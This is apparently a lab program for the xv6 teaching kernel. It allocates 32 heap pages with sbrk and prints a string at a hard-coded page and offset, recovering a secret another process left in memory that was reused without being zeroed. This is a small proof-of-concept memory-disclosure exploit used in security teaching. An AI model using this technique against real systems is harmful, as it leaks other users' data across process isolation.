#include "kernel/types.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define SECRET_PAGE 18
#define SECRET_OFF  4064

int
main(int argc, char *argv[])
{
  char *base = sbrk(PGSIZE * 32);
  if(base == (char *)-1){
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }
  printf("%s\n", base + SECRET_PAGE * PGSIZE + SECRET_OFF);
  exit(0);
}